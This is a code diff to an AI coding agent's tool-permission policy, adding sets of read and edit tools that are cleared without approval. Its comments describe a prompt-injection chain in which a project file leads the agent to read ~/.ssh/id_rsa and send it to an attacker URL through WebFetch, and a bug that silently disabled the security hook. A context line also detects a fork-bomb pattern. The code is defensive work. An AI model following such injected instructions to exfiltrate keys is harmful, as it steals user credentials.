@@ -80,6 +80,38 @@ export function comandoDestrutivo(cmd) {
     || c.includes(":(){");
 }
 
+/**
+ * READ tools — the only ones this policy clears without a card, and even then only after
+ * the fence (`caminhoProibido` and `dentroDoProjeto` are evaluated first).
+ *
+ * 🔴 `WebFetch` and `WebSearch` are NOT here, and the absence is the decision (finding
+ * F-13, ADR-032). They are not reads: they are **network egress**, the half that closes
+ * the chain. With `Read` of any path and `WebFetch` to any URL both automatic, a prompt
+ * injection in a project file composed `Read ~/.ssh/id_rsa` → `WebFetch
+ * https://attacker/?d=…` without a single approval card.
+ */
+export const LEITURA = new Set([
+  "Read", "Glob", "Grep", "LS", "NotebookRead", "TodoWrite",
+]);
+
+/**
+ * EDIT tools — what the `edit` and `auto` levels clear without a card.
+ *
+ * 🔴 This set used to live in `claude-runner.mjs` as `EDIT_TOOLS` and **vanished in
+ * 1.4.7**, when the policy was extracted into this module: the definition left, the
+ * reference stayed. `preToolUse` builds the literal `{ …, edicao: EDIT_TOOLS }` BEFORE
+ * calling `decidir()`, and an undeclared name in ESM is a `ReferenceError` — so the hook
+ * threw on EVERY tool call, at every level. The ADR-032 security boundary was off the
+ * air, and nothing said so.
+ *
+ * ⚠️ Why nobody saw it, and why both sets now live HERE: `politica.test.mjs` declared its
+ * own local copies of the read and edit sets and exercised `decidir()` with those. The
+ * proof never touched the file where the name was missing — two copies of one fact, and
+ * the test happened to hold the correct one. A single source, imported by both, is what
+ * stops the next divergence.
+ */
+export const EDICAO = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
+
 /** Ferramentas de leitura cujo alvo é um CAMINHO — as que a cerca confina. */
 export const PATH_ARG = {
   Read: "file_path",
